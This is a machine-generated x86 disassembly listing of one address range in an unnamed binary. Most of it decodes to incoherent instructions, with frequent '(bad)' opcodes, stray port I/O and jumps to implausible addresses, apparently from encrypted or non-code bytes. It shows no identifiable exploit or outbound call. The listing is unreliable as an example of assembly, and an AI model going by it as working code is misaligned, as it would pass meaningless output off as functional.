  408b8b:	xor    eax,0x82959f57
  408b90:	mov    BYTE PTR ss:[ecx],cl
  408b93:	cwde   
  408b94:	mov    al,0x4
  408b96:	cmp    esi,0x2
  408b99:	mov    bl,0x97
  408b9b:	sub    cl,BYTE PTR [ebp-0x47]
  408b9e:	int    0x7
  408ba0:	(bad)  
  408ba1:	jae    0x408b58
  408ba3:	cmp    dl,BYTE PTR [esi+0x73]
  408ba6:	inc    ecx
  408ba7:	mov    BYTE PTR [edx-0x4bcc206],dh
  408bad:	call   0x3d14:0x43ada8a0
  408bb4:	jo     0x408be5
  408bb6:	mov    dl,0xbe
  408bb8:	sahf   
  408bb9:	lock lods eax,DWORD PTR ds:[esi]
  408bbb:	mov    ecx,0x9bf8ad93
  408bc0:	mov    edx,0xb47b4cdf
  408bc5:	cmp    ecx,DWORD PTR [esp+eiz*8]
  408bc8:	push   ds
  408bc9:	inc    esp
  408bca:	(bad)  
  408bcb:	arpl   bp,sp
  408bcd:	mov    bh,0x0
  408bcf:	in     al,dx
  408bd0:	add    eax,0xe2002fa
  408bd5:	jle    0x408c3e
  408bd7:	push   0x7e
  408bd9:	mov    ds:0x24ad9743,al
  408bde:	dec    ebx
  408bdf:	and    DWORD PTR [edi-0x9],ebx
  408be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408be3:	xchg   edx,eax
  408be4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be5:	pop    edx
  408be6:	sbb    BYTE PTR [ebp+0x5f],bl
  408be9:	out    0x76,al
  408beb:	mov    ebp,0x809749e1
  408bf0:	bound  edx,QWORD PTR [edi]
  408bf2:	out    dx,eax
  408bf3:	out    dx,eax
  408bf4:	xchg   DWORD PTR ds:[ebp+0x11],ecx
  408bf8:	jmp    0xd1cc1462
  408bfd:	and    al,0xf8
  408bff:	inc    ebx
  408c00:	fmul   QWORD PTR [ebp+0x4]
  408c03:	fld    QWORD PTR [esi]
  408c05:	pop    es
  408c06:	pop    edi
  408c07:	push   ecx
  408c08:	(bad)  
  408c09:	retf   
  408c0a:	test   BYTE PTR ds:0xed15603,0xa7
  408c11:	push   es
  408c12:	lods   al,BYTE PTR ds:[esi]
  408c13:	rcr    DWORD PTR [ecx+0x63eeddf5],1
  408c19:	sub    dl,BYTE PTR [eax-0xc41812]
  408c1f:	jns    0x408c74
  408c21:	jb     0x408bb7
  408c23:	and    eax,0xb5b2863e
  408c28:	xchg   edi,eax
  408c29:	push   edi
  408c2a:	inc    ebx
  408c2b:	jns    0x408c53
  408c2d:	xchg   edx,eax
  408c2e:	sub    ch,BYTE PTR [edx+0x383d4cf6]
  408c34:	mov    eax,0xeeb57392
  408c39:	jg     0x408be8
  408c3b:	mov    cl,0x55
  408c3d:	fiadd  WORD PTR [edi-0x4d2d962f]
  408c43:	aad    0xce
  408c45:	dec    ebp
  408c46:	jno    0x408c68
  408c48:	fbld   TBYTE PTR [esp+eiz*4-0x4d2db7ce]
  408c4f:	dec    eax
  408c50:	mov    bh,0xff
  408c52:	lahf   
  408c53:	in     al,dx
  408c54:	push   ebx
  408c55:	jl     0x408c42
  408c57:	test   eax,0x547a1729
  408c5c:	mov    ds:0xd19c9012,eax
  408c61:	add    dh,BYTE PTR [ecx]
  408c63:	js     0x408cbb
  408c65:	repnz in eax,0x21
  408c68:	or     bl,BYTE PTR [ebp+0x4e]
  408c6b:	inc    ecx
  408c6c:	and    eax,0x72d40fdf
  408c71:	outs   dx,DWORD PTR ds:[esi]
  408c72:	sbb    edx,DWORD PTR [esi+0x3d6642e3]
  408c78:	mov    WORD PTR [esi-0x60],?
  408c7b:	mov    ebp,0xe1dc1540
  408c80:	mov    edx,0x81862a80
  408c85:	mov    ebp,0xbfe8c2f4
  408c8a:	add    eax,0xa2b21ec2
  408c8f:	(bad)  
  408c91:	repnz shl edx,cl
  408c94:	call   0x3524876d
  408c99:	scas   eax,DWORD PTR es:[edi]
  408c9a:	push   cs
  408c9b:	int    0xc5
  408c9d:	sti    
  408c9e:	xor    ebp,DWORD PTR [esi-0x77]
  408ca1:	fdivr  DWORD PTR ds:0xc3ed2c78
  408ca7:	jno    0x408cda
  408ca9:	push   edi
  408caa:	into   
  408cab:	mov    ebx,0x52b36045
  408cb0:	fiadd  DWORD PTR [ebp-0x2c]
  408cb3:	sub    DWORD PTR [edx],edx
  408cb5:	add    DWORD PTR [ebp-0x6c69b7af],ebx
  408cbb:	xor    eax,0x5381d4bc
  408cc0:	fcom   DWORD PTR [edi]
  408cc2:	jo     0x408d38
  408cc4:	xor    BYTE PTR ds:0x677a4b84,bl
  408cca:	inc    eax
  408ccb:	and    al,0xe1
  408ccd:	add    bl,BYTE PTR ds:0x2b27511d
  408cd3:	or     ah,bl
  408cd5:	(bad)  
  408cd6:	jmp    DWORD PTR [ecx]
  408cd8:	imul   esp,DWORD PTR [edx],0x8c73460f
  408cde:	pop    ds
  408cdf:	call   0xe231a1d6
  408ce4:	mov    dl,dh
  408ce6:	and    al,0xfa
  408ce8:	mov    esp,0xb819ce44
  408ced:	push   esp
  408cee:	push   0xffffffc9
  408cf0:	adc    dl,BYTE PTR [esi]
  408cf2:	lods   al,BYTE PTR ds:[esi]
  408cf3:	or     al,0x2e
  408cf5:	sbb    ah,ah
  408cf7:	dec    eax
  408cf8:	loope  0x408cf5
  408cfa:	imul   esp,DWORD PTR [esi+0x5cc4eab1],0xc7b836c8
  408d04:	test   al,0xcb
  408d06:	push   ebx
  408d07:	pop    esi
  408d08:	or     eax,0x4729dbf0
  408d0d:	jmp    0xfc288331
  408d12:	pop    edx
  408d13:	loope  0x408cf3
  408d15:	into   
  408d16:	push   ss
  408d17:	les    esp,FWORD PTR [ecx+0x4a5b2c12]
  408d1d:	lods   eax,DWORD PTR ds:[esi]
  408d1e:	jmp    0xe9141b42
  408d23:	push   esp
  408d24:	cld    
  408d25:	sbb    BYTE PTR [esi+0x3],dl
  408d28:	test   BYTE PTR [ebx],ah
  408d2a:	jno    0x408ce1
  408d2c:	or     DWORD PTR [ebp+eax*2+0x79f850cc],eax
  408d33:	mov    bl,0xd6
  408d35:	cmp    esi,eax
  408d37:	aam    0x85
  408d39:	xchg   DWORD PTR ds:0x9f3f187c,ebp
  408d3f:	loopne 0x408db3
  408d41:	add    cl,BYTE PTR [edx-0x74]
  408d44:	cld    
  408d45:	inc    ebp
  408d46:	inc    edi
  408d47:	enter  0x71a6,0x36
  408d4b:	dec    edx
  408d4c:	aad    0xe1
  408d4e:	mov    al,0xa4
  408d50:	sbb    cl,cl
  408d52:	cmp    BYTE PTR [edi],ch
  408d54:	mov    ds:0x48dea6c7,eax
  408d59:	dec    esi
  408d5a:	mov    eax,ds:0x9388c629
  408d5f:	rcr    BYTE PTR [ecx+0x11e81afe],0x3e
  408d66:	push   ebx
  408d67:	jge    0x408d2c
  408d69:	les    ebp,FWORD PTR [ecx+0x2507cbf9]
  408d6f:	inc    esp
  408d70:	xlat   BYTE PTR ss:[ebx]
  408d72:	pop    edi
  408d73:	inc    edi
  408d74:	xchg   esi,eax
  408d75:	cmp    edx,esi
  408d77:	pop    esp
  408d78:	xor    bh,0x9d
  408d7b:	ror    DWORD PTR [ecx],1
  408d7d:	fcmovnb st,st(4)
  408d7f:	sub    DWORD PTR [eax+ebx*1+0x342458c6],0xffffff9a
  408d87:	and    BYTE PTR [edx+esi*4+0x3d47f996],ah
  408d8e:	jnp    0x408dc3
  408d90:	add    DWORD PTR [esi-0x3e],0x2b5be0ad
  408d97:	test   BYTE PTR [ebx],ah
  408d99:	fimul  WORD PTR ss:[esi-0x73]
  408d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d9e:	adc    edx,DWORD PTR [eax]
  408da0:	inc    esp
  408da1:	les    edi,FWORD PTR [ecx]
  408da3:	dec    esi
  408da4:	push   es
  408da5:	outs   dx,BYTE PTR ds:[esi]
  408da6:	aam    0xfe
  408da8:	dec    esi
  408da9:	dec    esi
  408daa:	fmul   DWORD PTR [ebx-0x4ab2d33b]
  408db0:	inc    ecx
  408db1:	add    eax,0x4d0d1fd5
  408db6:	ret    0x1ff2
  408db9:	jecxz  0x408da9
  408dbb:	dec    eax
  408dbc:	cmp    al,0xf9
  408dbe:	xchg   edx,esi
  408dc0:	xor    edx,esi
  408dc2:	fnstenv [edi+esi*1-0x32]
  408dc6:	outs   dx,BYTE PTR ds:[esi]
  408dc7:	das    
  408dc8:	jg     0x408da5
  408dca:	adc    ebx,DWORD PTR [edi-0x74]
  408dcd:	mov    edx,0x33ec2dd2
  408dd2:	mov    dl,0x66
  408dd4:	ror    BYTE PTR [esi],cl
  408dd6:	pop    ss
  408dd7:	xchg   BYTE PTR [eax+0x2d],bh
  408dda:	popf   
  408ddb:	je     0x408ddd
  408ddd:	cdq    
  408dde:	xor    DWORD PTR ds:0xb92189bd,esp
  408de4:	push   edi
  408de5:	mov    edx,0xf5077be4
  408deb:	mov    cl,0x34
  408ded:	(bad)  [ecx]
  408def:	addr16 jnp 0x408e57
  408df2:	pop    ebp
  408df3:	retf   
  408df4:	add    DWORD PTR [ebp-0x20],esi
  408df7:	outs   dx,BYTE PTR ds:[esi]
  408df8:	push   edi
  408df9:	push   eax
  408dfa:	sbb    edx,DWORD PTR [edx]
  408dfc:	ret    0x309
  408dff:	cwde   
  408e00:	cmp    dl,ch
  408e02:	and    edi,DWORD PTR [edx+0x4a]
  408e05:	loop   0x408e0c
  408e07:	repz inc edi
  408e09:	repz (bad) 
  408e0b:	dec    BYTE PTR [ecx+0x20]
  408e0e:	stos   BYTE PTR es:[edi],al
  408e0f:	repz inc esp
  408e11:	in     eax,0x73
  408e13:	adc    BYTE PTR [eax+0x1e1efb8b],bh
  408e19:	out    0x5a,al
  408e1b:	es jne 0x408dc7
  408e1e:	and    DWORD PTR [ebp+0x6f7d5f09],esi
  408e24:	jg     0x408ea0
  408e26:	xchg   DWORD PTR [edi-0x6c8a35f0],edx
  408e2c:	clc    
  408e2d:	mov    al,0x4f
  408e2f:	xchg   esi,eax
  408e30:	bound  ebp,QWORD PTR [ebx+0x26]
  408e33:	xor    eax,DWORD PTR [ebp+edx*2+0x64143938]
  408e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e3b:	sbb    al,BYTE PTR [ebx+0x300c993c]
  408e41:	shrd   eax,edx,0x2
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	mov    WORD PTR [ecx-0x3b],cs
  408e78:	jl     0x408eb4
  408e7a:	push   ecx
  408e7b:	sbb    BYTE PTR [eax],bl
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    BYTE PTR [esi+0xfe0ba9f],ch
  408e86:	fist   DWORD PTR [esi]
  408e88:	inc    esp
  408e89:	shl    BYTE PTR [ebp+eax*1-0x3ea3dfd1],cl
  408e90:	mov    edx,0x9786c5fd
  408e95:	clc    
  408e96:	jl     0x408eab
  408e98:	fs scas al,BYTE PTR es:[edi]
  408e9a:	inc    ebp
  408e9b:	cmp    al,0x12
  408e9d:	out    0x49,al
  408e9f:	and    BYTE PTR [ebp+0x28],bl
  408ea2:	dec    esi
  408ea3:	ins    BYTE PTR es:[edi],dx
  408ea4:	sahf   
  408ea5:	sub    esi,DWORD PTR [ebx]
  408ea7:	fs or  ah,dh
  408eaa:	callw  0xec39
  408eae:	mov    dh,BYTE PTR [esi+0x3dedf2a0]
  408eb4:	xor    BYTE PTR [esi+0x562437c],0x27
  408ebb:	lods   al,BYTE PTR ds:[esi]
  408ebc:	(bad)  
  408ebd:	xchg   BYTE PTR ds:[esi],dl
  408ec0:	and    eax,0x5d86dcb8
  408ec5:	fwait
  408ec6:	lahf   
  408ec7:	imul   ebp,DWORD PTR [ecx-0x7adca096],0xffffffee
  408ece:	jl     0x408e9b
  408ed0:	shl    ecx,cl
  408ed2:	add    edx,edx
  408ed4:	mov    dh,0x7f
  408ed6:	jp     0x408edc
  408ed8:	stc    
  408ed9:	or     BYTE PTR [esp+edx*1-0x33b8f1ce],al
  408ee0:	cmp    ch,bh
  408ee2:	ret    0x8a3e
  408ee5:	xchg   ebx,eax
  408ee6:	sbb    eax,0x4467ea96
  408eeb:	jne    0x408e75
  408eed:	mov    ebx,0xf46c3fcb
  408ef2:	rol    BYTE PTR [edx-0x65],0x93
  408ef6:	xchg   esi,eax
  408ef7:	loopne 0x408ed6
  408ef9:	popf   
  408efa:	inc    ebx
  408efb:	aam    0x21
  408efd:	outs   dx,DWORD PTR ds:[esi]
  408efe:	loope  0x408ea8
  408f00:	push   0x78
  408f02:	jg     0x408e91
  408f04:	pop    eax
  408f05:	(bad)  
  408f07:	add    eax,0xdd6215da
  408f0c:	xor    BYTE PTR [edi],0xb0
  408f0f:	jns    0x408f75
  408f11:	shl    DWORD PTR [esi+0x64],cl
  408f14:	jmp    0x3f47822b
  408f19:	(bad)  
  408f1b:	mov    bh,BYTE PTR [eax+0x35]
  408f1e:	lods   eax,DWORD PTR ds:[esi]
  408f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f20:	and    BYTE PTR [ebp-0x51],ah
  408f23:	rcr    BYTE PTR [ecx-0x1311e224],cl
  408f29:	sbb    edi,DWORD PTR [esi+0x35]
  408f2c:	into   
  408f2d:	add    ebx,ebp
  408f2f:	lds    edx,FWORD PTR [ecx]
  408f31:	cwde   
  408f32:	pop    ds
  408f33:	outs   dx,BYTE PTR ds:[esi]
  408f34:	and    ebx,ebx
  408f36:	and    edi,DWORD PTR [esi-0x674218a5]
  408f3c:	xchg   edx,eax
  408f3d:	add    bl,BYTE PTR [edi-0xe2be9a5]
  408f43:	pop    esi
  408f44:	dec    ebp
  408f45:	jp     0x408f28
  408f47:	add    DWORD PTR [eax-0x78],edi
  408f4a:	pusha  
  408f4b:	mov    al,ds:0xa5ae27b9
  408f50:	cli    
  408f51:	mov    edi,0x578fa3ed
  408f56:	test   eax,0xe5ceab3e
  408f5b:	add    eax,0xd5370e40
  408f60:	mov    eax,?
  408f62:	add    bh,bh
  408f64:	(bad)  
  408f65:	loope  0x408fb3
  408f67:	cmp    BYTE PTR [ebp-0xa8caa0e],dh
  408f6d:	mov    esi,0xc089cb6c
  408f72:	(bad)  
  408f73:	push   eax
  408f74:	push   eax
  408f76:	in     eax,0x7
  408f78:	enter  0x2ca3,0x73
  408f7c:	pop    ss
  408f7d:	std    
  408f7e:	lock jbe 0x408f84
  408f81:	sbb    BYTE PTR ds:[ecx-0x69],0xb0
  408f86:	mov    dl,0xc2
  408f88:	and    edi,ebp
  408f8a:	test   eax,0x8b3bbf97
  408f8f:	pop    ss
  408f90:	jbe    0x408fb5
  408f92:	xchg   BYTE PTR [edi-0x75],ch
  408f95:	jmp    0x5c4c9c53
  408f9a:	test   al,0xea
  408f9c:	and    BYTE PTR [edi-0x63],0x66
  408fa0:	add    al,0x52
  408fa2:	xchg   ebx,eax
  408fa3:	inc    esi
  408fa4:	stos   BYTE PTR es:[edi],al
  408fa5:	or     bl,BYTE PTR [ecx+0x14b02a5e]
  408fab:	dec    ecx
  408fac:	sub    al,0x48
  408fae:	cld    
  408faf:	sar    ebx,cl
  408fb1:	lods   al,BYTE PTR ds:[esi]
  408fb2:	das    
  408fb3:	scas   eax,DWORD PTR es:[edi]
  408fb4:	cmp    BYTE PTR [eax+0xaf2dc04],ah
  408fba:	pop    ecx
  408fbb:	jnp    0x408f46
  408fbd:	iret   
  408fbe:	sbb    DWORD PTR [ebp-0x35],esp
  408fc1:	or     BYTE PTR [edi+0x5f4495c9],ch
  408fc7:	daa    
  408fc8:	fst    QWORD PTR [edx-0x59]
  408fcb:	in     eax,0x2a
  408fcd:	push   edi
  408fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fcf:	scas   al,BYTE PTR es:[edi]
  408fd0:	mov    eax,DWORD PTR [edi+0xdae5f5]
  408fd6:	imul   esp,DWORD PTR [ebx-0x54],0xed70cae1
  408fdd:	das    
  408fde:	fstp   QWORD PTR [ecx-0x1de3a89e]
  408fe4:	ins    BYTE PTR es:[edi],dx
  408fe5:	inc    edi
  408fe6:	and    al,0xa0
  408fe8:	fsubp  st(1),st
  408fea:	fsubr  DWORD PTR [eax+edi*1-0x4b561791]
  408ff1:	cli    
  408ff2:	add    al,0x2
  408ff4:	mov    ds:0xd7e922e5,al
  408ff9:	sbb    bl,BYTE PTR [edx]
  408ffb:	aam    0x38
  408ffd:	hlt    
  408ffe:	popf   
  408fff:	in     al,dx
  409000:	std    
  409001:	rcr    BYTE PTR [eax+0x4241f1a9],cl
  409007:	add    DWORD PTR [edi-0x7ad07c9e],esp
  40900d:	xor    edx,edi
  40900f:	shl    DWORD PTR [eax-0x4c],0xc8
  409013:	(bad)  
  409014:	stos   BYTE PTR es:[edi],al
  409015:	bound  eax,QWORD PTR [edi]
  409017:	push   esi
  409018:	stos   BYTE PTR es:[edi],al
  409019:	add    al,0x36
  40901b:	icebp  
  40901c:	leave  
  40901d:	pop    ecx
  40901e:	cmp    eax,0x44157c04
  409023:	(bad)  
  409024:	push   ss
  409025:	sbb    esp,DWORD PTR [ecx-0x17]
  409028:	xchg   esi,eax
  409029:	out    dx,al
  40902a:	in     al,dx
  40902b:	ja     0x40904d
  40902d:	test   DWORD PTR [ebp-0x7e5117e],ecx
  409033:	icebp  
  409034:	(bad)  
  409035:	mov    edi,0x6ed5f7d5
  40903a:	mov    edx,0x24439f8a
  40903f:	call   0x31ddd870
  409044:	dec    esp
  409045:	mov    eax,ds:0x5359d64
  40904a:	clc    
  40904b:	int    0xc8
  40904d:	jle    0x40909a
  40904f:	dec    eax
  409050:	pop    ebp
  409051:	call   0x2af7:0x7a16e8c0
  409058:	jl     0x409037
  40905a:	cmp    DWORD PTR cs:[ecx+eax*8+0x40],0xb35f31f8
  409063:	(bad)  
  409064:	mov    WORD PTR [ecx],?
  409066:	mov    eax,0x9cae94b
  40906b:	push   0x46da63f0
  409070:	adc    cl,BYTE PTR ds:0x5ec88b37
  409076:	enter  0xb1ca,0x3e
  40907a:	xchg   edi,eax
  40907b:	retf   0xa945
  40907e:	jle    0x4090e7
  409080:	xchg   DWORD PTR [ecx+eax*8],esi
  409083:	into   
  409084:	pop    edi
  409085:	inc    edi
  409086:	retf   0xa5d3
  409089:	adc    BYTE PTR [ebx+0x52],0x39
  40908d:	sbb    DWORD PTR [edi],eax
  40908f:	dec    eax
  409090:	icebp  
  409091:	test   al,0xbb
  409093:	xor    DWORD PTR [edi+ecx*2-0x3f],esp
  409097:	dec    ecx
  409098:	arpl   WORD PTR [esi+0x6aab6827],sp
  40909e:	movaps XMMWORD PTR [ebx+ebp*8-0xb],xmm1
  4090a3:	cmc    
  4090a4:	(bad)  
  4090a6:	mov    ds:0xd47c6c0,al
  4090ab:	pop    eax
  4090ad:	jp     0x4090d3
  4090af:	sub    eax,0x9f9ea40
  4090b4:	xor    DWORD PTR [ecx],esi
  4090b6:	push   edx
  4090b7:	sub    DWORD PTR [edx-0x31db92f4],edx
  4090bd:	push   esi
  4090be:	retf   
  4090bf:	lea    edx,[eax-0x63cd7974]
  4090c5:	(bad)  
  4090c6:	ret    0xd681
  4090c9:	mov    dh,0xf7
  4090cb:	or     bl,BYTE PTR [edx]
  4090cd:	or     DWORD PTR [ebp*4+0x21573022],0xfb6325b4
  4090d8:	cmp    BYTE PTR [edx-0x116d785b],bl
  4090de:	push   ds
  4090df:	push   ss
  4090e0:	mov    edi,0xfa20dcb
  4090e5:	adc    eax,0xe4d18f2d
  4090ea:	(bad)  
  4090ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ed:	jp     0x40915c
  4090ef:	test   al,0xaf
  4090f1:	retf   0xe18a
  4090f4:	mov    ebx,0x38bd9dc1
  4090f9:	push   cs
  4090fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090fb:	mov    eax,0xffbe1ac5
  409100:	jno    0x409132
  409102:	jb     0x409169
  409104:	stos   DWORD PTR es:[edi],eax
  409105:	test   eax,0x99a48ac0
  40910a:	and    eax,0xf4ba9f35
  40910f:	jge    0x409127
  409111:	lods   al,BYTE PTR ds:[esi]
  409112:	adc    BYTE PTR [edx+ecx*4+0x60a1e4b7],0xa9
  40911a:	(bad)  
  40911b:	mov    eax,ds:0x34c7b29d
  409120:	sub    esi,DWORD PTR [esi]
  409122:	mov    fs,esi
  409124:	in     al,0xea
  409126:	push   cs
  409127:	dec    eax
  409128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409129:	sti    
  40912a:	stos   DWORD PTR es:[edi],eax
  40912b:	push   ecx
  40912c:	das    
  40912d:	enter  0x6ea4,0x3a
  409131:	add    edi,DWORD PTR [ebx]
  409133:	ret    
  409134:	pop    ss
  409135:	mov    ds:0x4f2cfba2,eax
  40913a:	es popa 
  40913c:	pop    ss
  40913d:	or     ecx,DWORD PTR [edx+0x6]
  409140:	jb     0x4090ef
  409142:	sub    DWORD PTR [ebp+0x49],edi
  409145:	inc    esp
  409146:	jnp    0x409122
  409148:	sub    ah,BYTE PTR [ecx+edi*1+0x4e9d76e0]
  40914f:	jns    0x409122
  409151:	push   edi
  409152:	xor    BYTE PTR [edi-0x17],0x93
  409156:	inc    ecx
  409157:	lods   eax,DWORD PTR ds:[esi]
  409158:	mov    bl,0x87
  40915a:	and    eax,0x6443e04c
  40915f:	dec    eax
  409160:	mul    BYTE PTR [ebx-0x60]
  409163:	add    BYTE PTR [eax],dl
  409165:	sbb    BYTE PTR [ebx-0x2d],dl
  409168:	xor    eax,0xa615cad8
  40916d:	test   eax,0x201d49b1
  409172:	enter  0x8a1b,0xa8
  409176:	scas   al,BYTE PTR es:[edi]
  409177:	cld    
  409178:	daa    
  409179:	test   eax,0x7ff4bbfa
  40917e:	and    ebx,edi
  409180:	and    al,0x72
  409182:	outs   dx,BYTE PTR ds:[esi]
  409183:	sbb    al,0x3f
  409185:	nop
  409186:	mov    cl,0x2b
  409188:	xor    bh,BYTE PTR [ebp+0x2c3c65a9]
  40918e:	sub    eax,0x8492d171
  409193:	mov    bh,0x15
  409195:	out    dx,eax
  409196:	or     bh,ah
  409198:	jae    0x4091e3
  40919a:	mov    esi,0xe5914718
  40919f:	cs ror ch,1
  4091a2:	sti    
  4091a3:	popf   
  4091a4:	push   ecx
  4091a5:	jmp    0x40920f
  4091a7:	jae    0x409174
  4091a9:	dec    esp
  4091aa:	jbe    0x40920d
  4091ac:	mov    es,WORD PTR [ecx-0x52]
  4091af:	sti    
  4091b0:	rcr    BYTE PTR [edi],1
  4091b2:	jecxz  0x4091dc
  4091b4:	shl    DWORD PTR [ebx-0x16513cf5],cl
  4091ba:	dec    ebx
  4091bb:	das    
  4091bc:	retf   
  4091bd:	cmp    al,0x8b
  4091bf:	scas   eax,DWORD PTR es:[edi]
  4091c0:	jne    0x4091fd
  4091c2:	cld    
  4091c3:	aad    0x86
  4091c5:	cmp    al,0xa8
  4091c7:	mov    ch,0x5a
  4091c9:	jecxz  0x4091f3
  4091cb:	sub    al,0xb7
  4091cd:	jae    0x409192
  4091cf:	lahf   
  4091d0:	pop    ebp
  4091d1:	ins    BYTE PTR es:[edi],dx
  4091d2:	mov    cl,0x34
  4091d4:	inc    ecx
  4091d5:	or     BYTE PTR [esp+edx*2],bl
  4091d8:	pop    ebp
  4091d9:	mov    ds:0x799da436,al
  4091de:	mov    bh,BYTE PTR [ebx]
  4091e0:	pusha  
  4091e1:	enter  0xee13,0x62
  4091e5:	pushf  
  4091e6:	xor    eax,DWORD PTR [ecx+edx*8-0x145d2ae7]
  4091ed:	inc    ebp
  4091ee:	dec    BYTE PTR [ebx]
  4091f0:	cmpxchg dl,bh
  4091f3:	add    ah,BYTE PTR [edx-0x3a]
  4091f6:	jecxz  0x4091b7
  4091f8:	fisttp DWORD PTR [eax-0x73bce41f]
  4091fe:	js     0x409270
  409200:	dec    ebx
  409201:	push   eax
  409202:	js     0x409185
  409204:	nop
  409205:	push   es
  409206:	inc    ebp
  409207:	xor    DWORD PTR [eax+0x3e],edx
  40920a:	es jne 0x409253
  40920d:	inc    ebp
  40920e:	mov    esi,0xd66adfa8
  409213:	inc    edi
  409214:	inc    esi
  409215:	cdq    
  409216:	xchg   edx,eax
  409217:	and    DWORD PTR [ebp-0xf],esp
  40921a:	xlat   BYTE PTR ds:[ebx]
  40921b:	into   
  40921c:	addr16 mov al,ds:0x8e01
  409220:	or     cl,bl
  409222:	pusha  
  409223:	mov    esi,0xf3e1f4f4
  409228:	dec    esp
  409229:	les    edx,FWORD PTR [ebx-0x55]
  40922c:	scas   eax,DWORD PTR es:[edi]
  40922d:	outs   dx,DWORD PTR ds:[esi]
  40922e:	iret   
  40922f:	xor    dl,BYTE PTR [edx+0x58097e66]
  409235:	dec    edx
  409236:	add    ebx,DWORD PTR [ebx-0x63]
  409239:	outs   dx,DWORD PTR ds:[esi]
  40923a:	sbb    DWORD PTR [eax+esi*1-0x7a],eax
  40923e:	pop    esp
  40923f:	idiv   DWORD PTR cs:[ebx+0x33]
  409243:	ror    BYTE PTR [edi],cl
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	ret    0x3302
  409249:	ror    DWORD PTR [ecx-0x2616f3ab],1
  40924f:	add    eax,DWORD PTR [eax]
  409251:	add    dl,ah
  409253:	and    eax,0xea26ea26
  409258:	sbb    bl,BYTE PTR ds:0x70a1617f
  40925e:	dec    esp
  40925f:	xchg   BYTE PTR [edx],cl
  409261:	jle    0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [edi-0x6906185a],ch
  40926f:	lock xchg ebx,eax
  409271:	fld    TBYTE PTR [ecx]
  409273:	mov    dh,BYTE PTR [ecx+edi*8]
  409276:	adc    DWORD PTR [ebx+0x52],esp
  409279:	xchg   edi,eax
  40927a:	mov    ebp,DWORD PTR gs:[ecx+eiz*2-0x3]
  40927f:	sub    ecx,ebx
  409281:	pop    eax
  409282:	fisttp QWORD PTR [edi+0x622250d6]
  409288:	ret    
  409289:	pop    ebx
  40928a:	mov    dl,0x41
  40928c:	pusha  
  40928d:	enter  0x2ce3,0x68
  409291:	lds    ecx,FWORD PTR [ecx]
  409293:	add    eax,0xeaf25550
  409298:	stos   BYTE PTR es:[edi],al
  409299:	mov    ds:0x3c042c09,eax
  40929e:	mov    ah,0x73
  4092a0:	fist   WORD PTR [eax+eiz*2-0x74f6f453]
  4092a7:	push   cs
  4092a8:	gs out 0xf0,al
  4092ab:	mov    ch,0x87
  4092ad:	repz mov esp,0xf8bff4d4
  4092b3:	hlt    
  4092b4:	dec    edx
  4092b5:	fdiv   st(1),st
  4092b7:	pop    eax
  4092b8:	jno    0x409311
  4092ba:	and    bh,BYTE PTR [ebx+0x1]
  4092bd:	fst    QWORD PTR [edx]
  4092bf:	push   esi
  4092c0:	xchg   ebp,eax
  4092c1:	dec    edx
  4092c2:	jae    0x409283
  4092c4:	adc    DWORD PTR [ebx+eax*4-0x54a6d0f9],esp
  4092cb:	inc    esp
  4092cc:	mov    bh,0x33
  4092ce:	xor    al,0x9e
  4092d0:	jns    0x4092f4
  4092d2:	out    dx,eax
  4092d3:	mov    WORD PTR [esi+0x50b8905c],gs
  4092d9:	test   al,0x2
  4092db:	sahf   
  4092dc:	or     al,BYTE PTR [edi]
  4092de:	sbb    ch,dh
  4092e0:	retf   0x5a78
  4092e3:	call   0xc4a2df6c
  4092e8:	(bad)  
  4092e9:	cli    
  4092ea:	(bad)  
  4092ec:	dec    eax
  4092ed:	out    dx,al
  4092ee:	mov    edx,0x438a6605
  4092f3:	cmp    al,BYTE PTR [ebp-0x51a2e428]
  4092f9:	sbb    BYTE PTR [edx+0x0],dl
  4092fc:	shl    DWORD PTR [ecx],1
  4092fe:	jg     0x409284
  409300:	leave  
  409301:	push   ss
  409302:	xchg   esp,esp
  409304:	xchg   edx,eax
  409305:	lds    eax,FWORD PTR [esi]
  409307:	push   0xa87dbcfb
  40930c:	mov    esi,0xba104a8e
  409311:	xchg   DWORD PTR [eax],edi
  409313:	outs   dx,BYTE PTR ds:[esi]
  409314:	ds or  al,0xdf
  409317:	pop    ebx
  409318:	pop    ebp
  409319:	loop   0x409394
  40931b:	aam    0xaf
  40931d:	add    eax,0xd3f8167d
  409322:	pop    ds
  409323:	inc    esi
  409324:	sbb    ebx,edi
  409326:	xchg   BYTE PTR [ecx-0x3370d778],bl
  40932c:	mov    dh,0x3e
  40932e:	jnp    0x4092eb
  409330:	arpl   WORD PTR [ebp+0x46c67c69],bp
  409336:	sbb    DWORD PTR [eax+0x312c9b2],esi
  40933c:	in     al,dx
  40933d:	jae    0x4092d3
  40933f:	mov    ecx,DWORD PTR [edx]
  409341:	enter  0x91d6,0xac
  409345:	dec    ecx
  409346:	test   al,0x86
  409348:	pop    esi
  409349:	stos   BYTE PTR es:[edi],al
  40934a:	xchg   BYTE PTR es:[eax+0x68],cl
